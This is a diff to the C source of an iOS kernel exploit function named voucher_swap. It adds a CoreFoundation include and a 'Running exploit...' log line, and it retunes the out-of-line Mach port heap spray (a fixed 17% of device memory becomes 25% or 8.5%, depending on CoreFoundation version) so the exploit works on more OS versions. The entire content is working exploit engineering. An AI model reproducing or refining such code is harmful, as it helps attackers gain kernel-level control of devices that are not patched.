@@ -8,6 +8,7 @@
 #include <mach/mach.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <CoreFoundation/CFBase.h>
 
 #include "ipc_port.h"
 #include "kernel_alloc.h"
@@ -749,6 +750,8 @@ voucher_swap() {
 	if (!ok) {
 		fail();
 	}
+    
+    INFO("Running exploit...");
 
 	// 1. Create the thread whose ith_voucher field we will use during the exploit. This could
 	// be the current thread, but that causes a panic if we try to perform logging while not
@@ -878,7 +881,7 @@ voucher_swap() {
 	// kalloc.32768 zone. We need to do this slowly in order to force a zone garbage
 	// collection. Spraying 17% of memory (450 MB on the iPhone XR) with OOL ports should be
 	// plenty.
-	const size_t ool_ports_spray_size = 0.17 * platform.memory_size;
+	const size_t ool_ports_spray_size = (kCFCoreFoundationVersionNumber >= 1535.12 ? 0.25 : 0.085) * platform.memory_size;
 	mach_port_t *ool_holding_ports = gc_ports + gc_port_count;
 	size_t ool_holding_port_count = 500;	// Use at most 500 ports for the spray.
 	sprayed_size = ool_ports_spray_size_with_gc(ool_holding_ports, &ool_holding_port_count,
